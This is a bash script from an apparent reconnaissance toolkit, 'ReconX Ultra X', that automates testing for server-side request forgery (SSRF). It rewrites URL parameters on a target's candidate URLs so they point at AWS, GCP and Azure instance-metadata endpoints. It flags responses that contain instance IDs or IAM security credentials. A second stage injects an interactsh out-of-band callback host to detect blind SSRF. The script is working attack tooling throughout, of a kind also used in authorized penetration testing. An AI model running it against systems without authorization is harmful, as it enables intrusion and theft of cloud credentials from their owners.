#!/bin/bash
# ReconX Ultra X — SSRF Validation Pipeline
# Usage: ssrf_validator.sh <domain> <candidates_file> <output_json>
DOMAIN="$1"; CANDIDATES="$2"; OUTPUT="$3"
[[ -z "$DOMAIN" || ! -f "$CANDIDATES" ]] && exit 1
mkdir -p "$(dirname "$OUTPUT")"

TOTAL=$(wc -l < "$CANDIDATES")
echo "    ⏳ Testing $TOTAL SSRF candidates..."
RESULTS="[]"

# ── Cloud Metadata Endpoints ──────────────────────────────────────────────
CLOUD_URLS=("http://169.254.169.254/latest/meta-data/" "http://metadata.google.internal/computeMetadata/v1/" "http://169.254.169.254/metadata/instance")

# ── Step 1: Metadata Endpoint Testing ─────────────────────────────────────
echo "    ⏳ [1/2] Cloud metadata injection..."
META_FILE="$(dirname "$OUTPUT")/ssrf_meta.txt"
> "$META_FILE"

while IFS= read -r url; do
    [[ -z "$url" ]] && continue
    params=$(echo "$url" | grep -oP '[?&]\K[^=]+' | head -3)
    for p in $params; do
        for cloud_url in "${CLOUD_URLS[@]}"; do
            encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$cloud_url'))" 2>/dev/null)
            test_url=$(echo "$url" | sed "s/\(${p}=\)[^&]*/\1${encoded}/g")
            resp=$(curl -skL --max-time 8 "$test_url" 2>/dev/null)
            if echo "$resp" | grep -qi "ami-id\|instance-id\|computeMetadata\|iam/\|security-credentials"; then
                echo "${url}|||${p}|||${cloud_url}|||metadata" >> "$META_FILE"
                break 2
            fi
        done
    done
done < <(head -30 "$CANDIDATES")

meta_count=$(wc -l < "$META_FILE" 2>/dev/null || echo 0)
echo "    ✓ Metadata SSRF: $meta_count found"

# ── Step 2: Interactsh Callback ───────────────────────────────────────────
echo "    ⏳ [2/2] Callback testing..."
CALLBACK_FILE="$(dirname "$OUTPUT")/ssrf_callback.txt"
> "$CALLBACK_FILE"

if command -v interactsh-client &>/dev/null; then
    INTERACT_OUT="/tmp/interactsh_reconx_$$"
    interactsh-client -n 1 -o "$INTERACT_OUT" &>/dev/null &
    INTERACT_PID=$!
    sleep 3
    INTERACT_URL=$(head -1 "$INTERACT_OUT" 2>/dev/null | grep -oP '[a-z0-9]+\.oast\.[a-z]+')
    if [[ -n "$INTERACT_URL" ]]; then
        while IFS= read -r url; do
            params=$(echo "$url" | grep -oP '[?&]\K[^=]+' | head -2)
            for p in $params; do
                test_url=$(echo "$url" | sed "s/\(${p}=\)[^&]*/\1http:\/\/${INTERACT_URL}/g")
                curl -skL --max-time 5 "$test_url" &>/dev/null
            done
        done < <(head -20 "$CANDIDATES")
        sleep 5
        if [[ -f "$INTERACT_OUT" ]] && grep -q "http" "$INTERACT_OUT" 2>/dev/null; then
            echo "    ✓ Callbacks received!"
        fi
    fi
    kill "$INTERACT_PID" 2>/dev/null
    rm -f "$INTERACT_OUT"
else
    echo "    ⚠️  interactsh not installed — callback testing skipped"
fi

# ── Merge Results ─────────────────────────────────────────────────────────
python3 -c "
import json
results = []
try:
    with open('$META_FILE') as f:
        for line in f:
            parts = line.strip().split('|||')
            if len(parts) >= 4:
                results.append({
                    'url': parts[0], 'param': parts[1], 'payload': parts[2],
                    'confirmed': True, 'callback': False, 'tool': 'metadata-check'
                })
except: pass
with open('$OUTPUT', 'w') as f:
    json.dump(results, f, indent=2)
" 2>/dev/null

echo "    ✅ SSRF validation complete"
